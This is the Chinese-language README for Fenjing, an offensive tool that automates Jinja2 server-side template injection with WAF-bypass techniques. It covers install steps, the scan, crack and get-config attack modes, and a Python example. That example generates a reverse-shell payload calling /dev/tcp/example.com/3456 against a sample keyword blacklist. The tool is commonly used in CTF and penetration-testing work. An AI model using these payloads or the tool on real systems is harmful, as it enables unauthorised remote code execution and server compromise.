![焚靖](assets/fenjing.webp)

> Bypass the WAF without knowing WAF

焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能

## 演示

![demo](assets/demo.webp)

## 快速上手

在以下方法中选择一种

### 使用pip安装运行

```shell
pip install fenjing
python -m fenjing webui
```

### 下载并运行docker镜像

```shell
docker pull marven11/fenjing
docker run --net host -it marven11/fenjing webui
```

### 手动安装

```shell
git clone https://github.com/Marven11/Fenjing
cd Fenjing
python -m pip install -r requirements.txt
python -m fenjing webui
```

### 手动构建Docker镜像

```shell
docker build -t fenjing .
docker run -it --net host fenjing webui
```

## 特性

支持绕过：

- `'`和`"`
- 绝大多数敏感关键字
- 任意阿拉伯数字
- `_`
- `[`
- `+`
- `-`
- `~`
- `{{`

### 自然数绕过：

支持绕过0-9的同时绕过加号或减号

支持全角数字和特定数字相加减两种绕过方式

### `'%c'`绕过:

支持绕过引号，`g`和`lipsum`

### 下划线绕过：

支持`(lipsum|escape|batch(22)|list|first|last)`
- 其中的数字22支持上面的数字绕过

### 任意字符串：

支持绕过引号，任意字符串拼接符号，下划线和任意关键词

支持以下形式

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=cycler)|join`
    - 其中的下划线支持绕过
- `'%c'*3%(97,97, 97)`
    - 其中的`'%c'`也支持上面的`'%c'`绕过
    - 其中的所有数字都支持上面的数字绕过

### 属性：

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `|attr('aaa')`
    - 其中的字符串也支持上面的任意字符串绕过

### Item

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `.__getitem__('aaa')`
    - 其中的`__getitem__`支持上面的属性绕过
    - 其中的字符串也支持上面的任意字符串绕过


## 详细使用

### 作为命令行脚本使用

- webui: 网页UI
  - 顾名思义，网页UI
  - 默认端口11451
- scan: 扫描整个网站
  - 从网站中根据form元素提取出所有的表单并攻击
  - 扫描成功后会提供一个模拟终端或执行给定的命令
  - 示例：`python -m fenjing scan --url 'http://xxx/'`
- crack: 对某个特定的表单进行攻击
  - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
  - 攻击成功后也会提供一个模拟终端或执行给定的命令
  - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
- get-config: 对某个特定的表单进行攻击，但是只获取flask config
  - 参数大致上和crack相同
```
Usage: python -m fenjing scan [OPTIONS]

Options:
  -u, --url TEXT       需要扫描的URL
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.

Usage: python -m fenjing crack [OPTIONS]

Options:
  -u, --url TEXT       form所在的URL
  -a, --action TEXT    form的action，默认为当前路径
  -m, --method TEXT    form的提交方式，默认为POST
  -i, --inputs TEXT    form的参数，以逗号分隔
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.

Usage: python -m fenjing get-config [OPTIONS]

  攻击指定的表单，并获得目标服务器的flask config

Options:
  -u, --url TEXT     form所在的URL
  -a, --action TEXT  form的action，默认为当前路径
  -m, --method TEXT  form的提交方式，默认为POST
  -i, --inputs TEXT  form的参数，以逗号分隔
  --interval FLOAT   每次请求的间隔
  --user-agent TEXT  请求时使用的User Agent
  --help             Show this message and exit.
```

### 作为python库使用

参考[example.py](example.py)

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    print(f"{config_payload=}")

```

## 项目结构

[![](https://mermaid.ink/img/pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA?type=png)](https://mermaid.live/edit#pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA)


